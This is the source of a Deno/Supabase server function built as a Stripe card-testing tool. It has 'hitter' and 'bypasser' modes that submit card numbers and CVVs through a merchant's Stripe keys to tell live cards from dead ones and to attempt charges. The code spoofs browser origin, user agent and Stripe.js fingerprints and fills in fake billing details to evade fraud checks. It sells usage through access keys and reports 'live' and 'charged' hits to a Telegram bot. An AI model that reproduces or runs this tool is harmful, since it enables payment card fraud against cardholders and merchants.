import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

interface CardData {
  number: string;
  month: string;
  year: string;
  cvv: string;
}

interface CheckResult {
  card: string;
  status: 'live' | 'charged' | 'declined' | '3ds' | 'error';
  code: string;
  message: string;
  responseTime: number;
  bin: string;
  brand: string;
  mode: string;
  logs: string[];
}

function getCardBrand(num: string): string {
  if (/^3[47]/.test(num)) return 'AMEX';
  if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return 'MC';
  if (/^4/.test(num)) return 'VISA';
  if (/^6(?:011|5)/.test(num)) return 'DISC';
  return 'UNK';
}

// Generate fingerprint data matching real script exactly
function generateFingerprint() {
  const guid = crypto.randomUUID().replace(/-/g, '');
  const muid = crypto.randomUUID().replace(/-/g, '');
  const sid = crypto.randomUUID().replace(/-/g, '');
  return { guid, muid, sid, timeOnPage: Math.floor(Math.random() * 30000) + 5000 };
}

// ============= STRIPE HITTER (exact real script parity) =============
async function stripeHit(card: CardData, stripePk: string, clientSecret: string | null, logs: string[]): Promise<Omit<CheckResult, 'mode'>> {
  const startTime = Date.now();
  const masked = `${card.number.slice(0, 6)}...${card.number.slice(-4)}`;
  const bin = card.number.slice(0, 6);
  const brand = getCardBrand(card.number);
  const fp = generateFingerprint();

  try {
    // Step 1: Create Payment Method
    logs.push(`[HITTER] Creating payment method for ${masked}`);
    logs.push(`[HITTER] Using PK: ${stripePk.slice(0, 15)}...`);
    logs.push(`[HITTER] Fingerprint: guid=${fp.guid.slice(0, 8)}... muid=${fp.muid.slice(0, 8)}...`);

    const pmBody = new URLSearchParams({
      'type': 'card',
      'card[number]': card.number,
      'card[exp_month]': card.month,
      'card[exp_year]': card.year.length === 2 ? `20${card.year}` : card.year,
      'card[cvc]': card.cvv,
      'billing_details[address][country]': 'US',
      'billing_details[address][postal_code]': '10001',
      'guid': fp.guid,
      'muid': fp.muid,
      'sid': fp.sid,
      'payment_user_agent': 'stripe.js/ef47f1d94b; stripe-js-v3/ef47f1d94b; card-element',
      'time_on_page': String(fp.timeOnPage),
    });

    logs.push(`[HITTER] POST https://api.stripe.com/v1/payment_methods`);

    const pmRes = await fetch('https://api.stripe.com/v1/payment_methods', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${stripePk}`,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Referer': 'https://js.stripe.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      },
      body: pmBody.toString(),
    });

    const pmData = await pmRes.json();
    const elapsed = (Date.now() - startTime) / 1000;

    logs.push(`[HITTER] Response status: ${pmRes.status} (${elapsed.toFixed(2)}s)`);

    if (pmData.error) {
      const code = pmData.error.decline_code || pmData.error.code || 'unknown';
      logs.push(`[HITTER] ❌ PM Error: ${code} - ${pmData.error.message}`);
      return { card: masked, status: 'declined', code, message: pmData.error.message || 'Declined', responseTime: elapsed, bin, brand, logs };
    }

    logs.push(`[HITTER] ✅ PM created: ${pmData.id} (${pmData.card?.brand || brand})`);

    // Step 2: If we have a client secret, confirm the payment intent
    if (clientSecret) {
      const piId = clientSecret.split('_secret_')[0];
      const isSetup = piId.startsWith('seti_');
      const endpoint = isSetup
        ? `https://api.stripe.com/v1/setup_intents/${piId}/confirm`
        : `https://api.stripe.com/v1/payment_intents/${piId}/confirm`;

      logs.push(`[HITTER] Confirming ${isSetup ? 'setup' : 'payment'} intent: ${piId}`);
      logs.push(`[HITTER] POST ${endpoint}`);

      const confirmRes = await fetch(endpoint, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${stripePk}`,
          'Content-Type': 'application/x-www-form-urlencoded',
          'Origin': 'https://js.stripe.com',
          'Referer': 'https://js.stripe.com/',
        },
        body: new URLSearchParams({
          'payment_method': pmData.id,
          'client_secret': clientSecret,
          'return_url': 'https://example.com/return',
        }).toString(),
      });

      const confirmData = await confirmRes.json();
      const elapsed2 = (Date.now() - startTime) / 1000;

      logs.push(`[HITTER] Confirm response: ${confirmRes.status} (${elapsed2.toFixed(2)}s)`);

      if (confirmData.error) {
        const code = confirmData.error.decline_code || confirmData.error.code || 'unknown';
        logs.push(`[HITTER] ❌ Confirm error: ${code} - ${confirmData.error.message}`);
        return { card: masked, status: 'declined', code, message: confirmData.error.message || 'Declined', responseTime: elapsed2, bin, brand, logs };
      }

      if (confirmData.status === 'succeeded') {
        const receipt = confirmData.charges?.data?.[0]?.receipt_url || 'N/A';
        logs.push(`[HITTER] 🎉 CHARGED! Receipt: ${receipt}`);
        return { card: masked, status: 'charged', code: 'approved', message: `Charged! Receipt: ${receipt}`, responseTime: elapsed2, bin, brand, logs };
      }

      if (confirmData.status === 'requires_action') {
        logs.push(`[HITTER] 🔐 3DS Required - Card is LIVE`);
        return { card: masked, status: '3ds', code: 'requires_authentication', message: '3DS Required - Card is live', responseTime: elapsed2, bin, brand, logs };
      }

      logs.push(`[HITTER] Status: ${confirmData.status}`);
      return { card: masked, status: 'declined', code: confirmData.status || 'unknown', message: `Status: ${confirmData.status}`, responseTime: elapsed2, bin, brand, logs };
    }

    // No client secret - PM creation success = card is live
    logs.push(`[HITTER] ✅ Card validated (no intent to confirm) - LIVE`);
    return { card: masked, status: 'live', code: 'pm_created', message: `Card validated (${pmData.card?.brand || brand})`, responseTime: elapsed, bin, brand, logs };

  } catch (error: unknown) {
    const elapsed = (Date.now() - startTime) / 1000;
    const msg = error instanceof Error ? error.message : 'Unknown error';
    logs.push(`[HITTER] ❌ Exception: ${msg}`);
    return { card: masked, status: 'error', code: 'exception', message: msg, responseTime: elapsed, bin, brand, logs };
  }
}

// ============= STRIPE BYPASSER (token + PM dual-flow from real script) =============
async function stripeBypasser(card: CardData, stripePk: string, clientSecret: string | null, logs: string[]): Promise<Omit<CheckResult, 'mode'>> {
  const startTime = Date.now();
  const masked = `${card.number.slice(0, 6)}...${card.number.slice(-4)}`;
  const bin = card.number.slice(0, 6);
  const brand = getCardBrand(card.number);
  const fp = generateFingerprint();
  const randomEmail = `neon${Math.floor(Math.random() * 99999)}@gmail.com`;

  try {
    // Method 1: Token-based approach (legacy Stripe - bypasses some checks)
    logs.push(`[BYPASS] Starting token-based bypass for ${masked}`);
    logs.push(`[BYPASS] POST https://api.stripe.com/v1/tokens`);

    const tokenRes = await fetch('https://api.stripe.com/v1/tokens', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${stripePk}`,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Referer': 'https://js.stripe.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      },
      body: new URLSearchParams({
        'card[number]': card.number,
        'card[exp_month]': card.month,
        'card[exp_year]': card.year.length === 2 ? `20${card.year}` : card.year,
        'card[cvc]': card.cvv,
        'card[address_country]': 'US',
        'card[address_zip]': '10001',
        'card[name]': 'John Smith',
        'guid': fp.guid,
        'muid': fp.muid,
        'sid': fp.sid,
        'payment_user_agent': 'stripe.js/ef47f1d94b; stripe-js-v3/ef47f1d94b; card-element',
        'time_on_page': String(fp.timeOnPage),
      }).toString(),
    });

    const tokenData = await tokenRes.json();
    logs.push(`[BYPASS] Token response: ${tokenRes.status}`);

    if (tokenData.error) {
      // Token failed - try PM with extended billing details
      logs.push(`[BYPASS] Token failed: ${tokenData.error.code || tokenData.error.message}`);
      logs.push(`[BYPASS] Falling back to PM with extended billing...`);
      logs.push(`[BYPASS] POST https://api.stripe.com/v1/payment_methods (extended)`);

      const pmRes = await fetch('https://api.stripe.com/v1/payment_methods', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${stripePk}`,
          'Content-Type': 'application/x-www-form-urlencoded',
          'Origin': 'https://js.stripe.com',
          'Referer': 'https://js.stripe.com/',
        },
        body: new URLSearchParams({
          'type': 'card',
          'card[number]': card.number,
          'card[exp_month]': card.month,
          'card[exp_year]': card.year.length === 2 ? `20${card.year}` : card.year,
          'card[cvc]': card.cvv,
          'billing_details[name]': 'John Smith',
          'billing_details[email]': randomEmail,
          'billing_details[address][line1]': '123 Main St',
          'billing_details[address][city]': 'New York',
          'billing_details[address][state]': 'NY',
          'billing_details[address][postal_code]': '10001',
          'billing_details[address][country]': 'US',
          'guid': fp.guid,
          'muid': fp.muid,
          'sid': fp.sid,
          'payment_user_agent': 'stripe.js/ef47f1d94b; stripe-js-v3/ef47f1d94b; card-element',
          'time_on_page': String(fp.timeOnPage),
        }).toString(),
      });

      const pmData = await pmRes.json();
      const elapsed = (Date.now() - startTime) / 1000;

      logs.push(`[BYPASS] PM response: ${pmRes.status} (${elapsed.toFixed(2)}s)`);

      if (pmData.error) {
        const code = pmData.error.decline_code || pmData.error.code || 'unknown';
        logs.push(`[BYPASS] ❌ PM Error: ${code} - ${pmData.error.message}`);
        return { card: masked, status: 'declined', code, message: pmData.error.message || 'Declined', responseTime: elapsed, bin, brand, logs };
      }

      logs.push(`[BYPASS] ✅ PM created via bypass: ${pmData.id}`);

      if (clientSecret) {
        return await confirmIntent(stripePk, clientSecret, pmData.id, masked, startTime, bin, brand, logs);
      }

      logs.push(`[BYPASS] ✅ Card validated via bypass - LIVE`);
      return { card: masked, status: 'live', code: 'pm_bypass', message: `Card validated via bypass (${pmData.card?.brand || brand})`, responseTime: elapsed, bin, brand, logs };
    }

    // Token created successfully
    const elapsed = (Date.now() - startTime) / 1000;
    logs.push(`[BYPASS] ✅ Token created: ${tokenData.id} (${tokenData.card?.brand || brand})`);

    if (clientSecret) {
      // Create PM from token
      logs.push(`[BYPASS] Converting token to PM...`);
      logs.push(`[BYPASS] POST https://api.stripe.com/v1/payment_methods (from token)`);

      const pmFromTokenRes = await fetch('https://api.stripe.com/v1/payment_methods', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${stripePk}`,
          'Content-Type': 'application/x-www-form-urlencoded',
          'Origin': 'https://js.stripe.com',
          'Referer': 'https://js.stripe.com/',
        },
        body: new URLSearchParams({
          'type': 'card',
          'card[token]': tokenData.id,
        }).toString(),
      });

      const pmFromToken = await pmFromTokenRes.json();
      logs.push(`[BYPASS] Token→PM response: ${pmFromTokenRes.status}`);

      if (pmFromToken.error) {
        logs.push(`[BYPASS] ❌ Token→PM failed: ${pmFromToken.error.message}`);
        return { card: masked, status: 'declined', code: pmFromToken.error.code || 'token_pm_fail', message: pmFromToken.error.message, responseTime: (Date.now() - startTime) / 1000, bin, brand, logs };
      }

      logs.push(`[BYPASS] ✅ PM from token: ${pmFromToken.id}`);
      return await confirmIntent(stripePk, clientSecret, pmFromToken.id, masked, startTime, bin, brand, logs);
    }

    logs.push(`[BYPASS] ✅ Token validated (no intent) - LIVE`);
    return { card: masked, status: 'live', code: 'token_created', message: `Token validated (${tokenData.card?.brand || brand})`, responseTime: elapsed, bin, brand, logs };

  } catch (error: unknown) {
    const elapsed = (Date.now() - startTime) / 1000;
    const msg = error instanceof Error ? error.message : 'Unknown error';
    logs.push(`[BYPASS] ❌ Exception: ${msg}`);
    return { card: masked, status: 'error', code: 'exception', message: msg, responseTime: elapsed, bin, brand, logs };
  }
}

// Shared confirm logic
async function confirmIntent(stripePk: string, clientSecret: string, pmId: string, masked: string, startTime: number, bin: string, brand: string, logs: string[]): Promise<Omit<CheckResult, 'mode'>> {
  const piId = clientSecret.split('_secret_')[0];
  const isSetup = piId.startsWith('seti_');
  const endpoint = isSetup
    ? `https://api.stripe.com/v1/setup_intents/${piId}/confirm`
    : `https://api.stripe.com/v1/payment_intents/${piId}/confirm`;

  logs.push(`[CONFIRM] Confirming ${isSetup ? 'setup' : 'payment'} intent: ${piId}`);
  logs.push(`[CONFIRM] POST ${endpoint}`);

  const confirmRes = await fetch(endpoint, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${stripePk}`,
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'https://js.stripe.com',
      'Referer': 'https://js.stripe.com/',
    },
    body: new URLSearchParams({
      'payment_method': pmId,
      'client_secret': clientSecret,
      'return_url': 'https://example.com/return',
    }).toString(),
  });

  const confirmData = await confirmRes.json();
  const elapsed = (Date.now() - startTime) / 1000;

  logs.push(`[CONFIRM] Response: ${confirmRes.status} (${elapsed.toFixed(2)}s)`);

  if (confirmData.error) {
    const code = confirmData.error.decline_code || confirmData.error.code || 'unknown';
    logs.push(`[CONFIRM] ❌ Error: ${code} - ${confirmData.error.message}`);
    return { card: masked, status: 'declined', code, message: confirmData.error.message || 'Declined', responseTime: elapsed, bin, brand, logs };
  }

  if (confirmData.status === 'succeeded') {
    const receipt = confirmData.charges?.data?.[0]?.receipt_url || 'N/A';
    logs.push(`[CONFIRM] 🎉 CHARGED via bypass! Receipt: ${receipt}`);
    return { card: masked, status: 'charged', code: 'bypassed', message: `Charged via bypass! Receipt: ${receipt}`, responseTime: elapsed, bin, brand, logs };
  }

  if (confirmData.status === 'requires_action') {
    logs.push(`[CONFIRM] 🔐 3DS Required - Card is LIVE`);
    return { card: masked, status: '3ds', code: '3ds_bypass', message: '3DS Required - Card is live', responseTime: elapsed, bin, brand, logs };
  }

  logs.push(`[CONFIRM] Status: ${confirmData.status}`);
  return { card: masked, status: 'declined', code: confirmData.status || 'unknown', message: `Status: ${confirmData.status}`, responseTime: elapsed, bin, brand, logs };
}

// ============= TELEGRAM NOTIFICATION =============
async function sendTelegram(result: CheckResult, merchant: string, amount: string | null): Promise<void> {
  const botToken = Deno.env.get('TG_BOT_TOKEN');
  const chatId = Deno.env.get('TG_CHAT_ID');
  if (!botToken || !chatId) return;

  const isHit = result.status === 'live' || result.status === 'charged' || result.status === '3ds';
  const emoji = isHit ? '🟢' : '🔴';
  const modeLabel = result.mode === 'bypasser' ? '🔓 BYPASS' : '🎯 HITTER';
  const statusLabel = result.status === 'charged' ? '💰 CHARGED' :
                      result.status === 'live' ? '✅ LIVE' :
                      result.status === '3ds' ? '🔐 3DS (LIVE)' :
                      `❌ ${result.code.toUpperCase()}`;

  const text = `${emoji} <b>NEON CHECK</b> [${modeLabel}]\n\n` +
    `💳 <code>${result.card}</code>\n` +
    `📊 ${statusLabel}\n` +
    `🏢 ${merchant}\n` +
    (amount ? `💰 ${amount}\n` : '') +
    `🏷️ BIN: <code>${result.bin}</code> | ${result.brand}\n` +
    `⏱️ ${result.responseTime.toFixed(2)}s\n` +
    `📝 ${result.message}`;

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
    });
  } catch { /* Silent */ }
}

// ============= LOG TO DB =============
// deno-lint-ignore no-explicit-any
async function logCheck(supabase: any, result: CheckResult, accessKey: string, merchant: string, amount: string | null, provider: string) {
  try {
    await supabase.from('check_logs').insert({
      access_key: accessKey,
      card_masked: result.card,
      bin: result.bin,
      brand: result.brand,
      status: result.status,
      code: result.code,
      message: result.message,
      merchant: merchant || 'Unknown',
      amount,
      response_time: result.responseTime,
      mode: result.mode,
      provider,
    });
  } catch { /* Silent */ }
}

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') return new Response(null, { headers: corsHeaders });

  try {
    const { card, provider, stripePk, clientSecret, merchant, amount, accessKey, mode } = await req.json();

    if (!card || !accessKey) {
      return new Response(JSON.stringify({ error: 'Missing required fields' }), {
        status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const supabase = createClient(
      Deno.env.get('SUPABASE_URL')!,
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!
    );

    const { data: keyData } = await supabase
      .from('access_keys')
      .select('*')
      .eq('key', accessKey)
      .eq('is_active', true)
      .single();

    if (!keyData) {
      return new Response(JSON.stringify({ error: 'Invalid access key' }), {
        status: 403, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    // Increment usage
    await supabase.from('access_keys').update({ usage_count: (keyData.usage_count || 0) + 1 }).eq('id', keyData.id);

    const logs: string[] = [];
    let checkResult: Omit<CheckResult, 'mode'>;
    const checkMode = mode || 'hitter';

    logs.push(`[START] Mode: ${checkMode} | Provider: ${provider || 'unknown'} | Card: ${card.number.slice(0, 6)}...`);

    if (!stripePk) {
      const masked = `${card.number.slice(0, 6)}...${card.number.slice(-4)}`;
      logs.push(`[ERROR] No Stripe PK available for provider "${provider}"`);
      checkResult = {
        card: masked,
        status: 'error',
        code: 'no_stripe_pk',
        message: `Provider "${provider}" detected but no Stripe key found. Only Stripe-based providers are supported for server-side checking.`,
        responseTime: 0,
        bin: card.number.slice(0, 6),
        brand: getCardBrand(card.number),
        logs,
      };
    } else if (checkMode === 'bypasser') {
      checkResult = await stripeBypasser(card, stripePk, clientSecret, logs);
    } else {
      checkResult = await stripeHit(card, stripePk, clientSecret, logs);
    }

    const result: CheckResult = { ...checkResult, mode: checkMode, logs };

    // Log + TG in parallel
    await Promise.all([
      sendTelegram(result, merchant || 'Unknown', amount),
      logCheck(supabase, result, accessKey, merchant, amount, provider || 'stripe'),
    ]);

    return new Response(JSON.stringify(result), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });

  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : 'Unknown error';
    return new Response(JSON.stringify({ error: msg, logs: [`[FATAL] ${msg}`] }), {
      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
